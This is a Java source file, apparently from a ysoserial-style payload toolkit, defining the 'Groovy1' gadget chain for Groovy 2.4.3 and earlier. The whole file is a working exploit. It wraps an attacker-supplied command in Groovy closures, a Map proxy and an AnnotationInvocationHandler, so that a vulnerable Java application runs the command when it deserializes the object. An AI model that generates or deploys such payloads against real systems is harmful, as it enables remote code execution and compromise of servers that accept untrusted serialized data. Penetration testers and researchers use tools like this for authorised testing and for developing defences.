package com.ppp.chain.groovy;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.InvocationHandler;
import java.util.Map;


@Dependencies({"org.codehaus.groovy:groovy:<=2.4.3"})
@Authors({Authors.FROHOFF})
@Sink({Sink.Command})
public class Groovy1 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Groovy1.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

        final Map map = KickOff.createProxy(closure, Map.class);

        final InvocationHandler handler = KickOff.annotationInvocationHandler(map);

        return handler;
    }
}
